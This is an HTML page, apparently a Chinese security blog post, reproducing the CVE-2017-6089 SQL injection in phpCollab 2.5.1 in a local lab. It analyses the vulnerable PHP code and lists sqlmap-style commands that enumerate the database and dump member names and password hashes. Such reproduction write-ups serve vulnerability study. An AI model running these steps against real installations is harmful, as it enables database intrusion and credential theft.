@@ -1,0 +1,217 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8" />
+  
+  <title>CVE-2017-6089 SQL注入漏洞复现 | yh&#39;s blog</title>
+  <meta name="author" content="John Doe" />
+
+  
+  <meta name="description" content="" />
+  
+
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+  <meta property="og:title" content="CVE-2017-6089 SQL注入漏洞复现" />
+  <meta property="og:site_name" content="yh&#39;s blog" />
+
+  
+  
+
+  
+    <meta property="og:image" content="" />
+  
+
+  
+  <link href="/css/images/favicon.ico" rel="icon" />
+  
+
+  <link rel="alternate" href="/atom.xml" title="yh&#39;s blog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+
+
+  <!-- baidu webmaster push -->
+  <script src='//push.zhanzhang.baidu.com/push.js'></script>
+
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">yh&#39;s blog</a></h1>
+  <h2><a href="/"></a></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div></header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2018-08-07T16:00:00.000Z"><a href="/2018/08/08/2017-6089/">2018-08-08</a></time>
+      
+      
+  
+    <h1 class="title">CVE-2017-6089 SQL注入漏洞复现</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyl7h7b3j30cr07e78m.jpg" alt=""><br><a id="more"></a></p>
+<h1 id="漏洞介绍："><a href="#漏洞介绍：" class="headerlink" title="漏洞介绍："></a>漏洞介绍：</h1><p>漏洞被描述为：在phpcollab 2.5.1以及更早版本中存在SQL注入漏洞，允许远程攻击者执行任意的SQL指令。漏洞存在于3处，topics/deletetopics.php中project参数和id参数，bookmarks/deletebookmarks.php中的id参数，以及calendar/deletecalendar.php中的id参数。<br>在本地虚拟机中搭建此系统，逐一查看这些SQL注入点。  </p>
+<h1 id="工具选择："><a href="#工具选择：" class="headerlink" title="工具选择："></a>工具选择：</h1><p>1.虚拟机中搭建win7<br>2.安装java环境确保能够使用burpsuite<br>2.配置好Phpcollab<br>3.配置好PHPstudy  </p>
+<p>下载phpCollab-v2.5.1,放到web根目录下安装<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyq1d0tzj30uu0ja0ud.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyqzk4frj30uu0ja0ud.jpg" alt=""><br>登陆账号是admin<br>密码是phpcadmin<br>然后添加一个项目<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyrd4pr9j30oe0kdgmo.jpg" alt=""><br>然后添加一个讨论<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyrw5xicj30om0ewweq.jpg" alt=""></p>
+<h1 id="脚本分析："><a href="#脚本分析：" class="headerlink" title="脚本分析："></a>脚本分析：</h1><p>在/phpCollab-v2.5.1/topics/deletetopics.php第67~71行处:<br>$id = str_replace(“**”,”,”,$id);<br>$tmpquery = “WHERE topic.id IN($id) ORDER BY topic.subject”;<br>$listTopics = new request();<br>$listTopics-&gt;openTopics($tmpquery);<br>$comptListTopics = count($listTopics-&gt;top_id);</p>
+<p>代码首先把参数id中的**替换成逗号,然后直接拼接到SQL语句中赋值给$tmpquery,接着被传入openTopics()方法.<br>跟进该方法,在/phpCollab-v2.5.1/includes/request.class.php第509行左右,<br>function openTopics($querymore,$start=””,$rows=””)<br>    {<br>        global $tableCollab, $strings, $res, $row, $databaseType, $initrequest;</p>
+<pre><code>    $this-&gt;connectClass();
+    $sql = $initrequest[&quot;topics&quot;];
+    $sql .= &apos; &apos;.$querymore;
+
+    if ($databaseType == &quot;mysql&quot; &amp;&amp; $start != &quot;&quot;) 
+    {
+        $sql .= &quot; LIMIT $start,$rows&quot;;
+    }
+
+    if ($databaseType == &quot;postgresql&quot; &amp;&amp; $start != &quot;&quot;) 
+    {
+        $sql .= &quot; LIMIT $rows OFFSET $start&quot;;
+    }
+
+    $index = $this-&gt;query($sql);
+    while($this-&gt;fetch()) 
+    {
+        $this-&gt;top_id[] = ($row[0]);
+        $this-&gt;top_project[] = ($row[1]);
+        $this-&gt;top_owner[] = ($row[2]);
+        $this-&gt;top_subject[] = ($row[3]);
+        $this-&gt;top_status[] = ($row[4]);
+        $this-&gt;top_last_post[] = ($row[5]);
+        $this-&gt;top_posts[] = ($row[6]);
+        $this-&gt;top_published[] = ($row[7]);
+        $this-&gt;top_mem_id[] = ($row[8]);
+        $this-&gt;top_mem_login[] = ($row[9]);
+        $this-&gt;top_mem_name[] = ($row[10]);
+        $this-&gt;top_mem_email_work[] = ($row[11]);
+        $this-&gt;top_pro_id[] = ($row[12]);
+        $this-&gt;top_pro_name[] = ($row[13]);
+    }
+    $this-&gt;close();
+}
+</code></pre><p>传入之后又进行了一次SQL语句拼接,然后传入了query()方法,跟进该方法,在/phpCollab-v2.5.1/includes/request.class.php第35行左右,<br>function query($sql)<br>    {<br>        global $res,$databaseType,$comptRequest;</p>
+<pre><code>$comptRequest = $comptRequest + 1;
+
+if ($databaseType == &quot;mysql&quot;) 
+{
+    $this-&gt;index = mysql_query($sql, $res);
+}
+</code></pre><p>……<br>}<br>可以看到,$sql传入后进入mysql_query(),带入数据库进行SQL查询.<br>整个过程没有做过滤,所以产生了SQL注入漏洞。  </p>
+<h1 id="漏洞复现过程："><a href="#漏洞复现过程：" class="headerlink" title="漏洞复现过程："></a>漏洞复现过程：</h1><p>访问：<a href="http://10.18.74.150/php/topics/deletetopics.php?project=1&amp;PHPSESSID=67799533afe506fca2db18a7ccc14104&amp;id=1" target="_blank" rel="noopener">http://10.18.74.150/php/topics/deletetopics.php?project=1&amp;PHPSESSID=67799533afe506fca2db18a7ccc14104&amp;id=1</a><br>利用burpsuite抓包,将请求保存为sql.txt<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furywdf98tj30xk0ev0ud.jpg" alt="">  </p>
+<h3 id="1-检测注入"><a href="#1-检测注入" class="headerlink" title="1. 检测注入"></a>1. 检测注入</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furywwvg28j31br0c03zn.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyx2j8gaj31bb0bvq4p.jpg" alt=""></p>
+<h3 id="2-查库名"><a href="#2-查库名" class="headerlink" title="2. 查库名"></a>2. 查库名</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql –current-db<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyxoe6qzj30o406g74s.jpg" alt=""></p>
+<h3 id="3-查表名"><a href="#3-查表名" class="headerlink" title="3. 查表名"></a>3. 查表名</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco –tables<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyy6eib8j307p0gm3yt.jpg" alt=""></p>
+<h3 id="4-查表members中的列名"><a href="#4-查表members中的列名" class="headerlink" title="4. 查表members中的列名"></a>4. 查表members中的列名</h3><p>  -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco -T members –columns<br><img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyyk5l2kj31gm0jtacb.jpg" alt="">  </p>
+<h3 id="5-查列name和password中的数据"><a href="#5-查列name和password中的数据" class="headerlink" title="5. 查列name和password中的数据"></a>5. 查列name和password中的数据</h3><p> -r “C:\Users\33715\Desktop\sql.txt” –threads=10 –dbms=mysql -D phpco -T members -C name,password–dump<br> <img src="https://ws1.sinaimg.cn/large/006bMmGagy1furyz0928nj312s06pjrs.jpg" alt=""><br> 通过SQL注入漏洞,得到了管理员的密码。<br> 至此漏洞复现完成。</p>
+
+      
+    </div>
+    
+    <footer>
+        <div class="alignright">
+          
+          <a href='javascript:void(0)' class="share-link bdsharebuttonbox" data-cmd="more">分享</a>
+        </div>
+        
+        
+        <!-- partial('post/share') -->
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="Search">
+    <input type="hidden" name="q" value="site:yoursite.com">
+  </form>
+</div>
+
+  
+
+  
+<div class="widget tag">
+  <h3 class="title">Recent Posts</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2018/08/08/2017-6089/">CVE-2017-6089 SQL注入漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/30/2017-8570/">Office CVE-2017-8570 远程代码执行漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/24/图片隐写术/">国家网络安全周宣传周“巅峰极客”CTF misc---图片隐写术的简单示范</a>
+      </li>
+    
+      <li>
+        <a href="/2018/07/18/Github+Hexo搭建个人博客/">Github+hexo搭建个人博客教程</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+
+  
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  <p>
+  
+  &copy; 2018 John Doe
+  
+  All rights reserved.</p>
+  <p>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></p>
+</div>
+<div class="clearfix"></div>
+
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"1","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script></footer>
+  <script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+<div id='bg'></div>
+</body>
+</html>
